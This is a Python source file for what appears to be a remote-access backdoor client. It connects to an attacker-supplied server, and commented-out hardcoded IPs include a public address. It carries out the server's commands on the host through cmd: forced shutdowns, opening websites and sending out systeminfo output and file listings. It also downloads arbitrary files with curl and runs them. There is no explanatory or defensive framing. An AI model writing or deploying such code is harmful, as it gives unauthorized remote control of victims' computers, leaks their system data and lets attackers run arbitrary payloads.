import os, subprocess, threading, socket, time, pickle

# port = 5050
# server = "192.168.10.63"
#port = 17777
#server = '18.189.106.45'

# server = input('server ip: ')
# port = int(input('port: '))

coder = "utf-8"
buffer = 1024

DISCONNECT_MSG = "!DISCONNECT"

svd_f = 'sumting.txt'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if svd_f in os.listdir(os.getcwd()):
    with open(svd_f, 'rb') as file:
        try_server_data = pickle.load(file)
        server, port = try_server_data
    try:
        client.connect((server, port))
    except:
        server = input('server ip: ')
        port = int(input('port: '))
        client.connect((server, port))

if svd_f not in os.listdir(os.getcwd()):
    server = input('server ip: ')
    port = int(input('port: '))
    client.connect((server, port))
    with open(svd_f, 'wb') as file:
        pickle.dump((server, port), file)


connected = True

def send(msg):
    global connected
    if msg == DISCONNECT_MSG:
        connected = False
    msg = bytes(msg, coder)
    client.send(msg)

def cmdTalk(command):
    cmd = subprocess.Popen(f'cmd /k "{command}"', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = cmd.communicate()
    return out

def recv():
    global connected, server, port
    print("Listening for server cmd")
    while connected:

        msg = client.recv(buffer).decode(coder)
        if msg == 'kick':
            send(f"{DISCONNECT_MSG}")

        if 'shutdown' in msg:
            if 'shutdown -a' == msg:
                cmdTalk('shutdown -a')
            else:
                indic = msg.split(" /")[1:]
                # cmd = f"shutdown /{indic[0]} /{indic[1]} /{indic[2].split(' ')[0]} '{indic[2].split(' ')[1:]}'"
                wrnMsg = ''
                if '/c' in msg:
                    wrnMsg = msg.split('/c ')[1]
                command = f'shutdown /{indic[0]} /{indic[1]} /c "{wrnMsg}"'
                cmdTalk(command)

        if 'start' in msg:
            if 'www' in msg.split(' ')[1]:
                command = msg
            else:
                command = f'start www.{msg.split(" ")[1]}.com'
            cmdTalk(command)
        if msg == 'systeminfo':
            data = cmdTalk('systeminfo')
            data = str(data).split('\\r\\n')[1:]
            for thing in data:
                output = ''
                for ch in thing:
                    if ch != ' ':
                        output += ch
                data[data.index(thing)] = output
            send(f'system info of {client.getsockname()} / {data}')

        if 'download' in msg:
            all_files = os.listdir(os.getcwd())
            if '/' in msg:
                command = f"curl -O {msg.split(' ')[1]}"
                cmdTalk(command)
                all_newfiles = os.listdir(os.getcwd())
                print(all_files, all_newfiles)
                for file in all_newfiles:
                    if file not in all_files:
                        f_name, f_ext = os.path.splitext(file)
                        f_newname = f"{msg.split(' ')[3]}{f_ext}"
                        print(f_newname)
                        os.rename(file, f'{f_newname}')

            else:
                command = f"curl -O {msg.split(' ')[1]}"
                cmdTalk(command)
        if msg == 'get files':
            send(f'{os.getcwd()} files: {os.listdir(os.getcwd())}')
        if 'open' in msg:
            command = f'{os.getcwd()}\\{msg.split(" ")[1]}'
            cmdTalk(command)
        else:
            print(msg)

thred_recv = threading.Thread(target=recv)
thred_recv.start()






